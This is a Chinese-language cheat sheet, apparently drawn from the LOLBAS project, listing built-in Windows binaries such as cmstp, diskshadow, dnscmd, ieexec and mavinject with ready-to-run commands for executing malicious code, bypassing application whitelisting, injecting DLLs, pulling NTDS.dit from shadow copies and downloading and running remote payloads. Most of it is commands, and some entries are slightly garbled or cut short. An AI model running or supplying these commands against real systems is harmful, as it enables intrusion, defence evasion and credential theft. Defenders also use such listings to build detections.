## Cmstp.exe
CMSTP 是与Microsoft
连接管理器配置文件安装程序关联的二进制文件。它接受INF
文件，这些文件可以通过恶意命令武器化，以脚本（SCT）和DLL
的形式执行任意代码。
> **文件路径**C:\\Windows\\System32\\cmstp.exe
> C:\\Windows\\SysWOW64\\cmstp.exe
####### 执行恶意代码
在不创建桌面图标的情况下，静默安装特殊格式的本地.INF。 .INF
文件包含UnRegisterOCXSection 部分，该部分使用scrobj.dll 执行.SCT 文件。
> cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf
在不创建桌面图标的情况下，静默安装特殊格式的远程.INF。.INF
文件包含UnRegisterOCXSection 部分，该部分使用scrobj.dll 执行.SCT 文件。
> cmstp.exe /ni /s
> https://raw.githubusercontent.com/api0cradle/LOLBAS/master/O
> SBinaries/Payload/Cmstp.inf
用例：执行隐藏在inf 文件中的代码。直接从Internet 执行代码。 所需权限：
User 操作系统：Windows Vista，Windows 7，Windows 8，Windows 8.1，
Windows 10
## Diskshadow.exe
> **文 件 路 径 ：** C:\\Windows\\System32\\diskshadow.exe
> C:\\Windows\\SysWOW64\\diskshadow.exe
####### Dump
使用准备好的diskshadow 脚本中的diskshadow.exe 执行命令。
> diskshadow.exe /s c:\\test\\diskshadow.txt
用例：使用diskshadow 从VSS 中获取敏感数据，如NTDS.dit 所需权限：User
操作系统：Windows server
####### 执行恶意代码
使用diskshadow.exe 执行命令以生成子进程
> diskshadow\> exec calc.exe
用例：使用diskshadow 绕过防御性对策措施 所需权限：User 操作系统：
Windows server
## Dnscmd.exe
用于管理DNS 服务器的命令行界面的二进制程序
> **路径**C:\\Windows\\System32\\Dnscmd.exe
> C:\\Windows\\SysWOW64\\Dnscmd.exe
####### 执行恶意代码
添加特制DLL 作为DNS 服务的插件。此命令必须由至少是DnsAdmins
组成员的用户在DC 上运行。
> dnscmd.exe dc1.lab.int /config /serverlevelplugindll
> \\\\192.168.0.149\\dll\\wtf.dll
用例：远程注入dll 到dns 服务器 所需权限：DNS admin 操作系统：Windows
server
## Extexport.exe
####### 文件路径
> C:\\Program Files\\Internet Explorer\\Extexport.exe
>
> C:\\Program Files (x86)\\Internet Explorer\\Extexport.exe
####### 执行恶意代码
使用以下名称之一加载位于c:\\test 文件夹中的DLL
mozcrt19.dll，mozsqlite3.dll 或sqlite.dll
> Extexport.exe c:\\test foo bar
用例：执行dll 文件 所需权限：User 操作系统：Windows Vista，Windows 7，
Windows 8，Windows 8.1，Windows 10
## Forfiles.exe
选择并执行一个文件或一组文件的命令。常用于对批处理。
> **路径**C:\\Windows\\System32\\forfiles.exe
> C:\\Windows\\SysWOW64\\forfiles.exe
####### 执行恶意代码
执行calc.exe。
> forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe
执行evil.exe。
> forfiles /p c:\\windows\\system32 /m notepad.exe /c
> \"c:\\folder\\normal.dll:evil.exe\"
用例：使用forfiles 从隐藏在备用数据流中的二进制文件启动新进程 所需权限：
User 操作系统：Windows vista，Windows 7，Windows 8，Windows 8.1，
Windows 10
## Ftp.exe
用于连接FTP 服务器的二进制程序
> **文件路径**C:\\Windows\\System32\\ftp.exe
> C:\\Windows\\SysWOW64\\ftp.exe
####### 执行恶意代码
执行放在文本文件中的命令。
> echo !calc.exe \> ftpcommands.txt && ftp -s:ftpcommands.txt
用例：使用ftp.exe 生成新进程执行恶意代码。 所需的YourCommand 权限：用户
操作系统：Windows 7，Windows 8，Windows 8.1，Windows 10
## Gpscript.exe
> **文件路径**C:\\Windows\\System32\\gpscript.exe
> C:\\Windows\\SysWOW64\\gpscript.exe
####### 执行恶意代码
在组策略中配置登录脚本。
> Gpscript /logon
在组策略中配置启动脚本
> Gpscript /startup
用例：添加本地组策略登录脚本以执行文件并隐藏防御性对策措施 所需权限：
Administrator 操 作 系 统 ：Windows Vista，Windows 7，Windows 8，
Windows 8.1，Windows 10
具体参考： https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-
to-the-list/
## Hh.exe
用于在Windows 中处理chm 文件的二进制文件
####### 文件路径
> C:\\Windows\\System32\\hh.exeC:\\Windows\\SysWOW64\\hh.ex
####### 下载
使用HTML 帮助文件打开目标PowerShell 脚本。
> HH.exe 
####### 执行恶意代码
使用HTML 帮助文件执行calc.exe。
> HH.exe c:\\windows\\system32\\calc.exe
用例：使用HH.exe 执行其他进程或者恶意代码 所需权限：User 操作系统：
Windows Vista，Windows 7，Windows 8，Windows 8.1，Windows 10
## Ie4uinit.exe
> **文件路径**c:\\windows\\system32\\ie4uinit.exe
> c:\\windows\\sysWOW64\\ie4uinit.exe c:\\windows\\system32\\ieuinit.inf
> c:\\windows\\sysWOW64\\ieuinit.inf
####### 执行恶意代码
从专门准备的ie4uinit.inf 文件中执行命令。
> ie4uinit.exe -BaseSettings
用例：通过复制文件将代码执行到另一个位置 所需权限：User 操作系统：
Windows Vista，Windows 7，Windows 8，Windows 8.1，Windows 10
详情参考： https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-
execute-techniques-for-bypass-evasion-persistence-part-2/
## Ieexec.exe
IEExec.exe 是.Net 框架中的一个可执行文件，能够通过指定URL
来运行托管在远程目标上的应用程序。
> **文件路径**C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ieexec.exe
> C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ieexec.exe
####### 下载并执行恶意代码
从远程服务器下载并执行bypass.exe。
> ieexec.exe http://x.x.x.x:8080/bypass.exe
用例：从远程位置下载并运行攻击者代码 所需权限：User 操作系统：Windows
Vista，Windows 7，Windows 8，Windows 8.1，Windows 10
## Infdefaultinstall.exe
> **文件路径**C:\\Windows\\System32\\Infdefaultinstall.exe
> C:\\Windows\\SysWOW64\\Infdefaultinstall.exe
####### 执行恶意代码
使用scrobj.dll 从输入到特别准备的INF 文件中的命令执行SCT 脚本。
> InfDefaultInstall.exe Infdefaultinstall.inf
用例：代码执行 所需权限：User 操作系统：Windows Vista，Windows 7，
Windows 8，Windows 8.1，Windows 10
## Installutil.exe
Installer
工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服务器资源
> **文件路径**C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe
> C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe
> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe
> C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe
####### 应用程序白名单绕过
执行目标.NET DLL 或EXE。
> InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
####### 执行恶意代码
执行目标.NET DLL 或EXE。
> InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
用例：用于执行代码并绕过应用程序白名单 所需权限：User 操作系统： Windows
Vista，Windows 7，Windows 8，Windows 8.1，Windows 10
## Mavinject.exe
> **文件路径**C:\\Windows\\System32\\mavinject.exe
> C:\\Windows\\SysWOW64\\mavinject.exe
####### 执行恶意代码
使用PID 3110 将evil.dll 注入进程。
> MavInject.exe 3110 /INJECTRUNNING c:\\folder\\evil.dll
将存储为备用数据流（ADS）的file.dll 注入到具有PID 4172 的进程中
> Mavinject.exe 4172 /INJECTRUNNING \"c:\\ads\\file.txt:file.dll\"
用例：将dll 文件注入正在运行的进程 所需权限：User 操作系统：Windows
Vista，Windows 7，Windows 8，Windows 8.1，Windows 10
## Microsoft.Workflow.Compiler.exe
> **文件路径**C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.
> exe
####### 执行恶意代码
在test.xml 文件中引用的XOML 文件，编译并执行C＃或VB.net 代码。
> Microsoft.Workflow.Compiler.exe tests.xml results.xml
用例：编译和运行代码 所需权限：User 操作系统：Windows 10S
## Mmc.exe
将管理单元加载到本地、远程管理Windows 系统的二进制程序。
> **文件路径**C:\\Windows\\System32\\mmc.exe
> C:\\Windows\\SysWOW64\\mmc.exe
####### 执行恶意代码
启动"后台"MMC 进程并调用COM 有效负载
> mmc.exe -Embedding c:\\path\\to\\test.msc
用例：配置管理单元以加载已添加到注册表的COM 自定义类（CLSID）
所需权限：User 操作系统：Windows 10
## Msconfig.exe
MSConfig
是一个故障排除工具，用于临时禁用或重新启用在启动过程中运行的软件，设备驱动程序或Windows
服务，以帮助用户确定Windows 出现问题的原因
####### 文件路径
> C:\\Windows\\System32\\msconfig.exe
####### 执行恶意代码
执行在精心设计的c:\\windows\\system32\\mscfgtlc.xml 中嵌入的命令。
> Msconfig.exe -5